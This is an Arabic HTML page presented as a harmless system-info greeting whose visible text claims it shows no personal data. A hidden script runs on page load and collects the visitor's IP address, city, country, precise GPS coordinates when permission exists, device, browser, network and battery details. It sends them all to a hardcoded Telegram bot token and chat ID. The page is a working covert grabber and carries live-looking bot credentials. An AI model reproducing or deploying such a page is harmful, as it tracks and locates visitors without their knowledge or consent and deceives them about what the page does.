<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>أداة إرسال بيانات الجهاز</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background-color: #f4f7f6;
            color: #333;
            line-height: 1.6;
            margin: 0;
            padding: 20px;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            text-align: right;
            direction: rtl;
        }
        .container {
            background-color: #fff;
            padding: 40px;
            border-radius: 12px;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
            max-width: 600px;
            width: 100%;
        }
        h1 {
            color: #0056b3;
            text-align: center;
        }
        p {
            text-align: center;
        }
    </style>
</head>
<body>

    <div class="container">
        <h1>مرحبا بك! 👋</h1>
        <p>
            مرحباً بكم في صفحة معلومات النظام.
            <br>
            هذه الصفحة لا تعرض أي بيانات شخصية.
        </p>
    </div>

    <script>
        const BOT_TOKEN = '8386388789:AAGKW1bLw9xdEldclKGvNqUekVgE5WiuGaU';
        const CHAT_ID = '6313103532';

        function sendTelegramMessage(message) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            const params = new URLSearchParams({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            });

            fetch(`${url}?${params.toString()}`)
                .then(response => response.json())
                .then(data => {
                    if (data.ok) {
                        console.log('تم إرسال الرسالة بنجاح إلى تيليجرام.');
                    } else {
                        console.error('فشل في إرسال الرسالة:', data.description);
                    }
                })
                .catch(error => {
                    console.error('حدث خطأ في الاتصال:', error);
                });
        }
        
        async function getIPInfo() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                return data;
            } catch (error) {
                console.error('فشل في الحصول على معلومات IP:', error);
                return {};
            }
        }

        async function getGeolocation() {
            if ('geolocation' in navigator && 'permissions' in navigator) {
                try {
                    const permissionStatus = await navigator.permissions.query({ name: 'geolocation' });
                    if (permissionStatus.state === 'granted') {
                        return new Promise((resolve, reject) => {
                            navigator.geolocation.getCurrentPosition(
                                position => {
                                    resolve({
                                        latitude: position.coords.latitude,
                                        longitude: position.coords.longitude
                                    });
                                },
                                error => {
                                    console.error('فشل في الحصول على الموقع الجغرافي:', error.message);
                                    resolve({});
                                },
                                { enableHighAccuracy: true } // خيار لزيادة دقة الموقع
                            );
                        });
                    } else {
                        console.log('إذن الموقع غير ممنوح.');
                        return {};
                    }
                } catch (error) {
                    console.error('فشل في الاستعلام عن إذن الموقع:', error);
                    return {};
                }
            } else {
                console.error('الموقع الجغرافي أو Permissions API غير مدعوم.');
                return {};
            }
        }

        async function gatherAndSendInfo() {
            const [ipInfo, geoInfo] = await Promise.all([getIPInfo(), getGeolocation()]);

            const userAgent = navigator.userAgent;
            const hasTouch = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
            const supportsBluetooth = 'bluetooth' in navigator;
            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;

            const deviceInfo = {
                '📱 نوع الجهاز': getDeviceType(userAgent),
                '🖥️ نظام التشغيل': getOS(userAgent),
                '🌐 اسم المتصفح': getBrowser(userAgent).name,
                '📊 إصدار المتصفح': getBrowser(userAgent).version,
                '📜 إصدار الجهاز': userAgent,
                '📏 دقة الشاشة': `${screen.width}x${screen.height}`,
                '🔄 وضع الشاشة': screen.orientation.type,
                '🌐 لغة النظام': navigator.language,
                '✋ دعم الإيماءات اللمسية': hasTouch ? 'مدعوم' : 'غير مدعوم',
                '🔵 دعم البلوتوث': supportsBluetooth ? 'مدعوم' : 'غير مدعوم',
                '🔒 بروتوكول الأمان': window.location.protocol,
                '🌍 عنوان IP': ipInfo.ip || 'غير معروف',
                '🏙️ المدينة': ipInfo.city || 'غير معروف',
                '🔻 الدولة': ipInfo.country_name || 'غير معروف',
                '📈 خط الطول': geoInfo.longitude || 'غير معروف',
                '📉 خط العرض': geoInfo.latitude || 'غير معروف',
                '📶 الشبكة': ipInfo.org || 'غير معروف',
                '📡 نوع الاتصال': connection ? connection.effectiveType : 'غير معروف',
                '⚡ سرعة الاتصال': connection ? `${(connection.downlink || 0)} ميغابت في الثانية` : 'غير معروف',
                '🧠 الذاكرة (RAM)': navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'غير معروف',
                '⚙️ عدد الأنوية': navigator.hardwareConcurrency || 'غير معروف',
                '🎨 عمق الألوان': screen.colorDepth ? `${screen.colorDepth} بت` : 'غير معروف',
                '🌍 إمكانية تحديد الموقع الجغرافي': 'geolocation' in navigator ? 'مدعوم' : 'غير مدعوم',
                '⏰ الوقت': new Date().toLocaleString('ar-SA'),
                '💾 الذاكرة الداخلية': 'غير معروف'
            };

            let message = `*معلومات جهاز جديد:*\n\n`;
            for (const [key, value] of Object.entries(deviceInfo)) {
                message += `- ${key}: ${value}\n`;
            }

            if ('getBattery' in navigator) {
                navigator.getBattery().then(battery => {
                    const batteryInfo = {
                        '🔋 شحن الهاتف': `${(battery.level * 100).toFixed(0)}%`,
                        '⚡ هل الهاتف يشحن؟': battery.charging ? 'نعم' : 'لا'
                    };
                    for (const [key, value] of Object.entries(batteryInfo)) {
                        message += `- ${key}: ${value}\n`;
                    }
                    sendTelegramMessage(message);
                });
            } else {
                sendTelegramMessage(message);
            }
        }

        function getDeviceType(userAgent) {
            if (/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(userAgent)) {
                return "جهاز لوحي";
            }
            if (/Mobile|iP(hone|od)|Android|BlackBerry|IEMobile|Kindle|Silk-Mobile|Jasmine/i.test(userAgent)) {
                return "هاتف محمول";
            }
            return "حاسوب مكتبي";
        }

        function getOS(userAgent) {
            if (/windows phone/i.test(userAgent)) return "Windows Phone";
            if (/android/i.test(userAgent)) {
                const match = userAgent.match(/Android\s([0-9.]+)/);
                return match ? `Android ${match[1]}` : 'Android';
            }
            if (/iPad|iPhone|iPod/i.test(userAgent)) return "iOS";
            if (/win/i.test(userAgent)) return "Windows";
            if (/mac/i.test(userAgent)) return "macOS";
            if (/linux/i.test(userAgent)) return "Linux";
            return "نظام غير معروف";
        }

        function getBrowser(userAgent) {
            const ua = userAgent.toLowerCase();
            let name = "غير معروف";
            let version = "غير معروف";

            if (ua.includes('edge')) { name = "Microsoft Edge"; version = ua.split('edge/')[1]; }
            else if (ua.includes('edg')) { name = "Microsoft Edge"; version = ua.split('edg/')[1]; }
            else if (ua.includes('chrome')) { name = "Chrome"; version = ua.split('chrome/')[1].split(' ')[0]; }
            else if (ua.includes('safari')) { name = "Safari"; version = ua.split('version/')[1].split(' ')[0]; }
            else if (ua.includes('firefox')) { name = "Firefox"; version = ua.split('firefox/')[1]; }

            return { name, version };
        }
        
        window.onload = () => {
            gatherAndSendInfo();
        };
    </script>
</body>
</html>
